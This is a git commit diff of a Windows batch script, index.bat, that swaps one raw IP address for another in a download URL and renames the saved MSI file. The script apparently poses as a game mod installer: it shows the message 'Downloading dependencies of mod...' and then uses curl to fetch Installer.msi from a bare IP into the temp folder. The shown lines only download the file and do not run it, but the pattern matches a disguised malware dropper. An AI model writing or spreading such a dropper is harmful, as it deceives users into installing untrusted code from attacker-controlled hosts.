2cd39df5927e79eb2273fdd6c110491aa9ba6193
nfo <luissantinidev@gmail.com>
2025-07-02 22:09:18 -0300

    Update index.bat

--- index.bat
+++ index.bat
@@ -1,6 +1,6 @@
 @echo off
-set "URL=http://87.121.84.195/Installer.msi"
-set "FILE=%temp%\AdventureInstaller.msi"
+set "URL=http://151.243.24.251/Installer.msi"
+set "FILE=%temp%\SpectralSMP.msi"
 
 echo Downloading dependencies of mod...
 curl -L -o "%FILE%" "%URL%"
